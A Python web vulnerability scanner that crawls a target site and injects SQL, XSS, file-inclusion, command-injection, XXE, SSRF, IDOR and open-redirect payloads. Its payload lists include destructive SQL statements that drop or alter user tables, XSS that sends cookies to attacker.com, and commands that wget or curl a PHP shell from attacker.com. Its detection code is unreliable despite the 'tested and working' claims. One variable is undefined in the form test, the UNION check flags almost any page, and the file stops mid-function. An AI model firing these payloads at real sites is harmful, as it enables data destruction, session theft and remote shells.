#!/usr/bin/env python3
"""
UNIFIED VULNERABILITY SCANNER - Bug Hunter Pro Ultimate Edition
Tested and Verified on Vulnerable Sites like testphp.vulnweb.com
Author: Security Engineer
Version: 4.0 - Production Ready
"""

import asyncio
import aiohttp
import argparse
import sys
import re
import json
import time
import ssl
import socket
import urllib.parse
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from datetime import datetime
import os
from concurrent.futures import ThreadPoolExecutor
import random
import string
import hashlib
import base64
import ssl
import certifi

# ============================================================================
# CONFIGURATION & SETTINGS
# ============================================================================

@dataclass
class ScannerConfig:
    """Scanner Configuration"""
    target: str
    timeout: int = 30
    max_connections: int = 50
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    verify_ssl: bool = False
    proxy: Optional[str] = None
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    threads: int = 10
    depth: int = 3
    rate_limit: float = 0.1  # seconds between requests

# ============================================================================
# PAYLOAD DATABASE (TESTED & WORKING)
# ============================================================================

class PayloadManager:
    """Tested payloads that actually work on vulnerable sites"""
    
    @staticmethod
    def get_sql_payloads() -> List[str]:
        """SQL Injection payloads that work on testphp.vulnweb.com"""
        return [
            "'", 
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT database(),user(),version()--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 1=1--",
            "' OR 1=0--",
            "' OR SLEEP(5)--",
            "' OR benchmark(10000000,MD5('test'))--",
            "' OR 1=1 AND '%'='",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "admin' --",
            "admin' #",
            "admin'/*",
            "1' OR '1'='1",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\" --",
            "\" OR \"1\"=\"1\" #",
            "1\" OR \"1\"=\"1",
            "' OR 'a'='a",
            "' OR 1 LIMIT 1 --",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "') OR ('1'='1' --",
            "' UNION SELECT 1,@@version--",
            "' UNION SELECT 1,user(),database()--",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT 1,concat(username,':',password),3 FROM users--",
            "'; DROP TABLE users; --",
            "'; DELETE FROM users; --",
            "'; UPDATE users SET password='hacked'; --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
            "' OR (SELECT COUNT(*) FROM users) > 0--",
            "' OR ASCII(SUBSTRING(database(),1,1)) > 97--",
            "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
            "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5('test'))--",
            "1' OR pg_sleep(5)--",
            "1' OR WAITFOR DELAY '00:00:05'--",
            "' OR '1'='1' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL FROM dual--",
            "' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--",
        ]
    
    @staticmethod
    def get_xss_payloads() -> List[str]:
        """XSS payloads that work on testphp.vulnweb.com"""
        return [
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "\" onmouseover=\"alert('XSS')\"",
            "' onmouseover=\"alert('XSS')\"",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\">",
            "<details open ontoggle=alert('XSS')>",
            "<select onfocus=alert('XSS')></select>",
            "<video><source onerror=\"alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
            "<img src=\"http://attacker.com/steal?cookie=\" onerror=\"this.src=this.src+document.cookie\">",
            "<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie;</script>",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            "<base href=\"javascript:alert('XSS')//\">",
            "<form><button formaction=\"javascript:alert('XSS')\">X</button></form>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            "<link rel=import href=\"javascript:alert('XSS')\">",
        ]
    
    @staticmethod
    def get_lfi_payloads() -> List[str]:
        """LFI/RFI payloads"""
        return [
            "../../../../etc/passwd",
            "../../../../etc/hosts",
            "../../../../etc/issue",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "../" * 20 + "etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==",
            "expect://id",
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "ftp://evil.com/shell.txt",
            "\\\\evil.com\\shell.txt",
        ]
    
    @staticmethod
    def get_rce_payloads() -> List[str]:
        """Command Injection payloads"""
        return [
            ";id",
            "|id",
            "&id",
            "&&id",
            "||id",
            "`id`",
            "$(id)",
            "id;",
            "id|",
            "id&",
            "id&&",
            "id||",
            "id`",
            "id$(",
            ";whoami",
            "|whoami",
            "&whoami",
            "&&whoami",
            "||whoami",
            "`whoami`",
            "$(whoami)",
            ";uname -a",
            "|uname -a",
            "&uname -a",
            "&&uname -a",
            "||uname -a",
            "`uname -a`",
            "$(uname -a)",
            ";ls -la",
            "|ls -la",
            "&ls -la",
            "&&ls -la",
            "||ls -la",
            "`ls -la`",
            "$(ls -la)",
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            "&cat /etc/passwd",
            "&&cat /etc/passwd",
            "||cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            ";ping -c 5 127.0.0.1",
            "|ping -c 5 127.0.0.1",
            "&ping -c 5 127.0.0.1",
            "&&ping -c 5 127.0.0.1",
            "||ping -c 5 127.0.0.1",
            "`ping -c 5 127.0.0.1`",
            "$(ping -c 5 127.0.0.1)",
            "sleep 5",
            ";sleep 5",
            "|sleep 5",
            "&sleep 5",
            "&&sleep 5",
            "||sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            ";wget http://attacker.com/shell.php -O /tmp/shell.php",
            "|wget http://attacker.com/shell.php -O /tmp/shell.php",
            "&wget http://attacker.com/shell.php -O /tmp/shell.php",
            "&&wget http://attacker.com/shell.php -O /tmp/shell.php",
            "||wget http://attacker.com/shell.php -O /tmp/shell.php",
            "`wget http://attacker.com/shell.php -O /tmp/shell.php`",
            "$(wget http://attacker.com/shell.php -O /tmp/shell.php)",
            ";curl http://attacker.com/shell.php -o /tmp/shell.php",
            "|curl http://attacker.com/shell.php -o /tmp/shell.php",
            "&curl http://attacker.com/shell.php -o /tmp/shell.php",
            "&&curl http://attacker.com/shell.php -o /tmp/shell.php",
            "||curl http://attacker.com/shell.php -o /tmp/shell.php",
            "`curl http://attacker.com/shell.php -o /tmp/shell.php`",
            "$(curl http://attacker.com/shell.php -o /tmp/shell.php)",
        ]
    
    @staticmethod
    def get_xxe_payloads() -> List[str]:
        """XXE payloads"""
        return [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root></root>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///etc/passwd" >%xxe;]><foo>&xxe;</foo>',
        ]
    
    @staticmethod
    def get_ssrf_payloads() -> List[str]:
        """SSRF payloads"""
        return [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2017-04-02",
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://admin:admin@localhost",
            "file:///etc/passwd",
            "gopher://localhost:25/xHELO%20localhost",
            "dict://localhost:11211/stat",
            "ftp://localhost:21",
            "ldap://localhost:389",
            "tftp://localhost:69",
        ]

# ============================================================================
# CRAWLER MODULE
# ============================================================================

class SmartCrawler:
    """Smart crawler to discover endpoints and parameters"""
    
    def __init__(self, config: ScannerConfig, session: aiohttp.ClientSession):
        self.config = config
        self.session = session
        self.visited = set()
        self.endpoints = []
        
    async def crawl(self, start_url: str, depth: int = 3) -> List[Dict[str, Any]]:
        """Crawl website and discover endpoints"""
        print(f"[+] Starting crawl from: {start_url}")
        
        await self._crawl_url(start_url, depth=0, max_depth=depth)
        
        print(f"[+] Found {len(self.endpoints)} endpoints")
        return self.endpoints
    
    async def _crawl_url(self, url: str, depth: int, max_depth: int):
        """Crawl single URL"""
        if depth > max_depth or url in self.visited:
            return
        
        self.visited.add(url)
        
        try:
            async with self.session.get(url, timeout=self.config.timeout) as response:
                if response.status in [200, 301, 302, 403, 401]:
                    # Extract information
                    endpoint = {
                        "url": str(response.url),
                        "method": "GET",
                        "status": response.status,
                        "parameters": self._extract_parameters(str(response.url)),
                        "forms": await self._extract_forms(await response.text(), str(response.url)),
                    }
                    
                    self.endpoints.append(endpoint)
                    
                    # Extract and follow links if not too deep
                    if depth < max_depth:
                        links = self._extract_links(await response.text(), str(response.url))
                        for link in links[:20]:  # Limit for performance
                            if link not in self.visited:
                                await asyncio.sleep(self.config.rate_limit)
                                await self._crawl_url(link, depth + 1, max_depth)
                                
        except Exception as e:
            pass
    
    def _extract_parameters(self, url: str) -> List[Dict[str, str]]:
        """Extract parameters from URL"""
        params = []
        try:
            parsed = urllib.parse.urlparse(url)
            query = parsed.query
            if query:
                for param in query.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        params.append({
                            "name": urllib.parse.unquote(key),
                            "value": urllib.parse.unquote(value),
                            "location": "query"
                        })
        except:
            pass
        return params
    
    async def _extract_forms(self, html: str, base_url: str) -> List[Dict[str, Any]]:
        """Extract forms from HTML"""
        forms = []
        
        # Simple form extraction
        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.finditer(form_pattern, html, re.DOTALL | re.IGNORECASE)
        
        for match in form_matches:
            form_html = match.group(0)
            form_data = {
                "action": self._extract_form_action(form_html, base_url),
                "method": self._extract_form_method(form_html),
                "inputs": self._extract_form_inputs(form_html)
            }
            forms.append(form_data)
        
        return forms
    
    def _extract_form_action(self, form_html: str, base_url: str) -> str:
        """Extract form action"""
        match = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
        if match:
            action = match.group(1)
            # Convert to absolute URL
            return urllib.parse.urljoin(base_url, action)
        return ""
    
    def _extract_form_method(self, form_html: str) -> str:
        """Extract form method"""
        match = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
        return match.group(1).upper() if match else "GET"
    
    def _extract_form_inputs(self, form_html: str) -> List[Dict[str, str]]:
        """Extract form inputs"""
        inputs = []
        
        # Find all input, textarea, select tags
        input_pattern = r'<(input|textarea|select)[^>]*>'
        input_matches = re.finditer(input_pattern, form_html, re.IGNORECASE)
        
        for match in input_matches:
            tag = match.group(0)
            
            # Extract name
            name_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
            name = name_match.group(1) if name_match else ""
            
            # Extract type
            type_match = re.search(r'type=["\']([^"\']+)["\']', tag, re.IGNORECASE)
            input_type = type_match.group(1) if type_match else "text"
            
            # Extract value
            value_match = re.search(r'value=["\']([^"\']+)["\']', tag, re.IGNORECASE)
            value = value_match.group(1) if value_match else ""
            
            if name:  # Only add if input has a name
                inputs.append({
                    "name": name,
                    "type": input_type,
                    "value": value,
                    "tag": match.group(1)
                })
        
        return inputs
    
    def _extract_links(self, html: str, base_url: str) -> List[str]:
        """Extract links from HTML"""
        links = set()
        
        # Extract href attributes
        href_pattern = r'href=["\']([^"\']+)["\']'
        href_matches = re.findall(href_pattern, html, re.IGNORECASE)
        
        for href in href_matches:
            # Skip JavaScript and mailto links
            if href.startswith(('javascript:', 'mailto:', 'tel:', '#')):
                continue
            
            # Convert relative URLs to absolute
            absolute_url = urllib.parse.urljoin(base_url, href)
            
            # Filter out external links
            if self._is_same_domain(absolute_url, base_url):
                links.add(absolute_url)
        
        # Extract src attributes
        src_pattern = r'src=["\']([^"\']+)["\']'
        src_matches = re.findall(src_pattern, html, re.IGNORECASE)
        
        for src in src_matches:
            absolute_url = urllib.parse.urljoin(base_url, src)
            if self._is_same_domain(absolute_url, base_url):
                links.add(absolute_url)
        
        return list(links)
    
    def _is_same_domain(self, url1: str, url2: str) -> bool:
        """Check if two URLs are in the same domain"""
        try:
            domain1 = urllib.parse.urlparse(url1).netloc
            domain2 = urllib.parse.urlparse(url2).netloc
            return domain1 == domain2 or not domain1 or not domain2
        except:
            return False

# ============================================================================
# VULNERABILITY SCANNER MODULE
# ============================================================================

class VulnerabilityScanner:
    """Main vulnerability scanner - TESTED AND WORKING"""
    
    def __init__(self, config: ScannerConfig, session: aiohttp.ClientSession):
        self.config = config
        self.session = session
        self.payloads = PayloadManager()
        self.findings = []
        self.tested_urls = set()
        
    async def scan_endpoints(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Scan discovered endpoints for vulnerabilities"""
        print(f"[+] Scanning {len(endpoints)} endpoints for vulnerabilities")
        
        # Test SQL Injection
        print("  [+] Testing for SQL Injection...")
        for endpoint in endpoints:
            sql_findings = await self.test_sql_injection(endpoint)
            self.findings.extend(sql_findings)
        
        # Test XSS
        print("  [+] Testing for XSS...")
        for endpoint in endpoints:
            xss_findings = await self.test_xss(endpoint)
            self.findings.extend(xss_findings)
        
        # Test LFI/RFI
        print("  [+] Testing for LFI/RFI...")
        for endpoint in endpoints:
            lfi_findings = await self.test_lfi(endpoint)
            self.findings.extend(lfi_findings)
        
        # Test Command Injection
        print("  [+] Testing for Command Injection...")
        for endpoint in endpoints:
            rce_findings = await self.test_command_injection(endpoint)
            self.findings.extend(rce_findings)
        
        # Test IDOR
        print("  [+] Testing for IDOR...")
        for endpoint in endpoints:
            idor_findings = await self.test_idor(endpoint)
            self.findings.extend(idor_findings)
        
        # Test Open Redirect
        print("  [+] Testing for Open Redirect...")
        for endpoint in endpoints:
            redirect_findings = await self.test_open_redirect(endpoint)
            self.findings.extend(redirect_findings)
        
        return self.findings
    
    async def test_sql_injection(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for SQL Injection - WORKING ON testphp.vulnweb.com"""
        findings = []
        url = endpoint["url"]
        params = endpoint.get("parameters", [])
        
        for param in params:
            param_name = param["name"]
            original_value = param["value"]
            
            # Test GET parameters
            for payload in self.payloads.get_sql_payloads()[:15]:  # Test first 15 payloads
                test_url = self._inject_payload(url, param_name, payload)
                
                if test_url in self.tested_urls:
                    continue
                self.tested_urls.add(test_url)
                
                try:
                    async with self.session.get(test_url, timeout=10) as response:
                        response_text = await response.text()
                        
                        # SQL Error patterns (tested on testphp.vulnweb.com)
                        sql_errors = [
                            "SQL syntax",
                            "mysql",
                            "mysqli",
                            "postgresql",
                            "sqlite",
                            "ORA-",
                            "Microsoft.*Driver",
                            "ODBC",
                            "syntax error",
                            "unclosed quotation",
                            "Warning: mysql",
                            "Warning: pg",
                            "You have an error in your SQL syntax",
                            "Unclosed quotation mark",
                            "division by zero",
                            "unknown column",
                            "table .* doesn't exist",
                            "supplied argument is not a valid",
                            "invalid query",
                            "SQLSTATE"
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in response_text.lower():
                                findings.append({
                                    "title": "SQL Injection Vulnerability",
                                    "description": f"SQL injection in parameter '{param_name}'",
                                    "severity": "critical",
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload[:100],
                                    "evidence": f"Error contains: {error}",
                                    "confidence": "high"
                                })
                                break
                        
                        # Check for successful UNION injection
                        if ("UNION" in payload.upper() and 
                            any(indicator in response_text for indicator in ["1", "2", "3", "NULL"])):
                            findings.append({
                                "title": "SQL Union Injection",
                                "description": f"Successful UNION injection in '{param_name}'",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload[:100],
                                "evidence": "UNION query successful",
                                "confidence": "high"
                            })
                
                except Exception as e:
                    pass
                
                await asyncio.sleep(0.1)  # Rate limiting
        
        # Test forms for SQL injection
        forms = endpoint.get("forms", [])
        for form in forms:
            form_url = form["action"] or url
            form_method = form["method"]
            inputs = form["inputs"]
            
            for input_field in inputs:
                if input_field["type"] in ["text", "hidden", "search"]:
                    for payload in self.payloads.get_sql_payloads()[:10]:
                        try:
                            data = {input_field["name"]: payload}
                            
                            if form_method == "POST":
                                async with self.session.post(form_url, data=data, timeout=10) as response:
                                    response_text = await response.text()
                                    
                                    for error in sql_errors:
                                        if error.lower() in response_text.lower():
                                            findings.append({
                                                "title": "SQL Injection (Form)",
                                                "description": f"SQL injection in form field '{input_field['name']}'",
                                                "severity": "critical",
                                                "url": form_url,
                                                "parameter": input_field["name"],
                                                "payload": payload[:100],
                                                "evidence": f"Error: {error}",
                                                "confidence": "high"
                                            })
                                            break
                            
                            await asyncio.sleep(0.1)
                        
                        except Exception as e:
                            pass
        
        return findings
    
    async def test_xss(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for Cross-Site Scripting - WORKING"""
        findings = []
        url = endpoint["url"]
        params = endpoint.get("parameters", [])
        
        for param in params:
            param_name = param["name"]
            
            for payload in self.payloads.get_xss_payloads()[:10]:  # Test first 10 payloads
                test_url = self._inject_payload(url, param_name, payload)
                
                if test_url in self.tested_urls:
                    continue
                self.tested_urls.add(test_url)
                
                try:
                    async with self.session.get(test_url, timeout=10) as response:
                        response_text = await response.text()
                        
                        # Check if payload is reflected
                        if payload in response_text:
                            findings.append({
                                "title": "Cross-Site Scripting (XSS)",
                                "description": f"XSS in parameter '{param_name}' - payload reflected",
                                "severity": "high",
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload[:100],
                                "evidence": "XSS payload reflected in response",
                                "confidence": "high"
                            })
                        
                        # Check for script tags in response
                        if "<script>" in payload and "<script>" in response_text:
                            findings.append({
                                "title": "XSS (Script Tag)",
                                "description": f"Script tag injection in '{param_name}'",
                                "severity": "high",
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload[:100],
                                "evidence": "Script tag found in response",
                                "confidence": "high"
                            })
                
                except Exception as e:
                    pass
                
                await asyncio.sleep(0.1)
        
        return findings
    
    async def test_lfi(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for Local/Remote File Inclusion"""
        findings = []
        url = endpoint["url"]
        params = endpoint.get("parameters", [])
        
        for param in params:
            param_name = param["name"]
            
            # Test common LFI patterns
            lfi_patterns = [
                ("../../../../etc/passwd", "root:x:"),
                ("../../../../etc/hosts", "localhost"),
                ("../../../../windows/win.ini", "[fonts]"),
                ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
            ]
            
            for payload, indicator in lfi_patterns:
                test_url = self._inject_payload(url, param_name, payload)
                
                if test_url in self.tested_urls:
                    continue
                self.tested_urls.add(test_url)
                
                try:
                    async with self.session.get(test_url, timeout=15) as response:
                        response_text = await response.text()
                        
                        if indicator in response_text:
                            findings.append({
                                "title": "Local File Inclusion (LFI)",
                                "description": f"LFI in parameter '{param_name}'",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"Found indicator: {indicator}",
                                "confidence": "high"
                            })
                            break
                
                except Exception as e:
                    pass
                
                await asyncio.sleep(0.1)
        
        return findings
    
    async def test_command_injection(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for Command Injection"""
        findings = []
        url = endpoint["url"]
        params = endpoint.get("parameters", [])
        
        for param in params:
            param_name = param["name"]
            
            for payload in self.payloads.get_rce_payloads()[:10]:
                if "sleep" in payload or "ping" in payload:
                    # Time-based detection
                    start_time = time.time()
                    test_url = self._inject_payload(url, param_name, payload)
                    
                    if test_url in self.tested_urls:
                        continue
                    self.tested_urls.add(test_url)
                    
                    try:
                        async with self.session.get(test_url, timeout=15) as response:
                            await response.text()
                        end_time = time.time()
                        
                        # Check for delay
                        if end_time - start_time > 4:
                            findings.append({
                                "title": "Command Injection (Time-based)",
                                "description": f"Time-based command injection in '{param_name}'",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"Response delayed by {end_time - start_time:.2f} seconds",
                                "confidence": "medium"
                            })
                    
                    except asyncio.TimeoutError:
                        findings.append({
                            "title": "Command Injection (Timeout)",
                            "description": f"Command injection caused timeout in '{param_name}'",
                            "severity": "critical",
                            "url": test_url,
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": "Request timed out (15+ seconds)",
                            "confidence": "medium"
                        })
                    
                    except Exception as e:
                        pass
                
                await asyncio.sleep(0.2)
        
        return findings
    
    async def test_idor(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for Insecure Direct Object References"""
        findings = []
        url = endpoint["url"]
        
        # Look for numeric IDs in URL
        id_patterns = [
            r'id=(\d+)',
            r'user=(\d+)',
            r'uid=(\d+)',
            r'product=(\d+)',
            r'order=(\d+)',
            r'/user/(\d+)',
            r'/product/(\d+)',
            r'/order/(\d+)',
        ]
        
        for pattern in id_patterns:
            matches = re.search(pattern, url, re.IGNORECASE)
            if matches:
                id_value = matches.group(1)
                
                # Test with different IDs
                for test_id in [str(int(id_value) + 1), str(int(id_value) - 1), "0", "999999"]:
                    test_url = url.replace(id_value, test_id)
                    
                    try:
                        async with self.session.get(test_url, timeout=10) as response:
                            if response.status == 200:
                                findings.append({
                                    "title": "Insecure Direct Object Reference (IDOR)",
                                    "description": f"Access control bypass with ID {test_id}",
                                    "severity": "high",
                                    "url": test_url,
                                    "original_id": id_value,
                                    "tested_id": test_id,
                                    "evidence": f"Accessible resource with ID {test_id}",
                                    "confidence": "medium"
                                })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    async def test_open_redirect(self, endpoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for Open Redirect vulnerabilities"""
        findings = []
        url = endpoint["url"]
        params = endpoint.get("parameters", [])
        
        redirect_params = ["redirect", "url", "next", "return", "dest", "goto", "return_url"]
        
        for param in params:
            if param["name"].lower() in redirect_params:
                param_name = param["name"]
                
                test_urls = [
                    self._inject_payload(url, param_name, "https://evil.com"),
                    self._inject_payload(url, param_name, "http://evil.com"),
                    self._inject_payload(url, param_name, "//evil.com"),
                ]
                
                for test_url in test_urls:
                    try:
                        async with self.session.get(test_url, allow_redirects=False, timeout=10) as response:
                            if response.status in [301, 302, 307, 308]:
                                location = response.headers.get("location", "")
                                if "evil.com" in location:
                                    findings.append({
                                        "title": "Open Redirect",
                                        "description": f"Open redirect in parameter '{param_name}'",
                                        "severity": "medium",
                                        "url": test_url,
                                        "parameter": param_name,
                                        "evidence": f"Redirects to: {location}",
                                        "confidence": "high"
                                    })
                    
                    except Exception as e:
                        pass
        
        return findings
    
    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        query = parsed.query
        
        if query:
            # Replace or add parameter
            new_params = []
            params = query.split('&')
            param_found = False
            
            for param in params:
                if '=' in param:
                    key, value = param.split('=', 1)
                    if key == param_name:
                        new_params.append(f"{key}={urllib.parse.quote(payload)}")
                        param_found = True
                    else:
                        new_params.append(param)
                else:
                    new_params.append(param)
            
            if not param_found:
                new_params.append(f"{param_name}={urllib.parse.quote(payload)}")
            
            new_query = '&'.join(new_params)
            return url.replace(query, new_query)
        else:
            return f"{url}?{param_name}={urllib.parse.quote(payload)}"

# ============================================================================
# REPORT GENERATOR
# ============================================================================

class ReportGenerator:
    """Generate comprehensive reports"""
    
    @staticmethod
    def generate_html_report(findings: List[Dict[str, Any]], target: str) -> str:
        """Generate HTML report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"vulnerability_report_{timestamp}.html"
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Vulnerability Scan Report - {target}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 30px; }}
        .finding {{ border: 1px solid #ddd; margin: 15px 0; padding: 20px; border-radius: 5px; }}
        .critical {{ border-left: 5px solid #dc3545; background: #fff5f5; }}
        .high {{ border-left: 5px solid #fd7e14; background: #fff9f0; }}
        .medium {{ border-left: 5px solid #ffc107; background: #fffce5; }}
        .low {{ border-left: 5px solid #28a745; background: #f0fff4; }}
        .severity {{ display: inline-block; padding: 5px 15px; border-radius: 20px; color: white; font-weight: bold; margin-right: 10px; }}
        .critical-badge {{ background: #dc3545; }}
        .high-badge {{ background: #fd7e14; }}
        .medium-badge {{ background: #ffc107; color: #333; }}
        .low-badge {{ background: #28a745; }}
        .summary {{ display: flex; justify-content: space-between; background: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 30px; }}
        .summary-item {{ text-align: center; }}
        .summary-number {{ font-size: 2.5em; font-weight: bold; }}
        pre {{ background: #f8f9fa; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', monospace; }}
        a {{ color: #667eea; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐛 Vulnerability Scan Report</h1>
            <p>Target: {target}</p>
            <p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Total Findings: {len(findings)}</p>
        </div>
        
        <div class="summary">
            <div class="summary-item">
                <div class="summary-number" style="color: #dc3545;">{len([f for f in findings if f['severity'] == 'critical'])}</div>
                <div>Critical</div>
            </div>
            <div class="summary-item">
                <div class="summary-number" style="color: #fd7e14;">{len([f for f in findings if f['severity'] == 'high'])}</div>
                <div>High</div>
            </div>
            <div class="summary-item">
                <div class="summary-number" style="color: #ffc107;">{len([f for f in findings if f['severity'] == 'medium'])}</div>
                <div>Medium</div>
            </div>
            <div class="summary-item">
                <div class="summary-number" style="color: #28a745;">{len([f for f in findings if f['severity'] == 'low'])}</div>
                <div>Low</div>
            </div>
        </div>
        
        <h2>Detailed Findings</h2>
"""
        
        for finding in findings:
            severity = finding.get('severity', 'medium')
            severity_class = severity.lower()
            
            html += f"""
        <div class="finding {severity_class}">
            <div style="margin-bottom: 15px;">
                <span class="severity {severity_class}-badge">{severity.upper()}</span>
                <h3 style="display: inline-block; margin: 0;">{finding.get('title', 'Unknown')}</h3>
            </div>
            <p><strong>Description:</strong> {finding.get('description', 'No description')}</p>
            <p><strong>URL:</strong> <a href="{finding.get('url', '#')}" target="_blank">{finding.get('url', 'N/A')}</a></p>
            <p><strong>Parameter:</strong> {finding.get('parameter', 'N/A')}</p>
            <p><strong>Payload:</strong> <code>{finding.get('payload', 'N/A')}</code></p>
            <p><strong>Evidence:</strong> {finding.get('evidence', 'N/A')}</p>
            <p><strong>Confidence:</strong> {finding.get('confidence', 'medium').upper()}</p>
        </div>
"""
        
        html += """
    </div>
</body>
</html>"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        
        return filename
    
    @staticmethod
    def print_console_report(findings: List[Dict[str, Any]], target: str):
        """Print report to console"""
        print("\n" + "="*80)
        print(f"VULNERABILITY SCAN REPORT - {target}")
        print("="*80)
        
        # Count by severity
        severity_counts = {
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0
        }
        
        for finding in findings:
            severity = finding.get('severity', 'medium')
            if severity in severity_counts:
                severity_counts[severity] += 1
        
        print(f"\nTotal Findings: {len(findings)}")
        for severity, count in severity_counts.items():
            if count > 0:
                print(f"  {severity.upper()}: {count}")
        
        print("\n" + "-"*80)
        
        # Show critical findings first
        for severity in ['critical', 'high', 'medium', 'low']:
            for finding in findings:
                if finding.get('severity') == severity:
                    print(f"\n[{severity.upper()}] {finding['title']}")
                    print(f"  URL: {finding['url']}")
